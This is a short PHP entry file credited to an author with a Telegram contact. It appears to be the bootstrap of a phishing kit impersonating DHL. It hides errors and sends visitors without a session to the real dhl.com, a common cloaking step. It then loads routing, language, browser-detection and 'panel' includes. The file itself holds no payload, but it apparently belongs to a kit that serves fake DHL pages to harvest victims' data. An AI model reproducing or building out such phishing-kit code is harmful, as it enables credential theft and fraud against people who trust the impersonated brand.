<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    session_start();
    error_reporting(0);

    if( !isset($_SESSION['last_page']) || empty($_SESSION['last_page']) ) {
        header("Location: https://www.dhl.com/");
        exit();
    }

    define('MAIN', realpath(__DIR__) . '/');
    define('BASEPATH', rtrim(dirname($_SERVER['SCRIPT_NAME']), '/') . '/');
    define('IMGSPATH',BASEPATH . 'media/imgs');
    define('CSSPATH',BASEPATH . 'media/css');
    define('JSPATH',BASEPATH . 'media/js');

    include MAIN . 'inc/BrowserDetection.php';
    include MAIN . 'inc/functions.php';
    include MAIN . 'inc/Route.php';
    include MAIN . 'inc/lang.php';
    include MAIN . 'inc/panel.php';

?>